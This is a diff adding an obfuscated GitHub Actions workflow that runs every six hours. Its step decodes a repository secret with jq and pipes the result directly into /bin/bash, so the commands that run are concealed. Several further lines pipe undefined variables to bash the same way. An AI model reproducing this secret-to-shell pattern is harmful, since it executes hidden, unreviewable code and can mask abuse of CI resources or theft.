@@ -1,0 +1,21 @@
+name: fuwenpeishouer
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuwenpeishouer
+        env:
+          h58291: ${{ secrets.h58291 }}
+        run: |
+          echo $h58291 | jq -r .zuekp118 | /bin/bash
+          echo $zk8745 | jq -r .myiab3 | /bin/bash
+          echo $yea39 | jq -r .bfpji93957 | /bin/bash
+          echo $nfnmb2 | jq -r .m9298 | /bin/bash
+          echo $hani5 | jq -r .du4 | /bin/bash
+
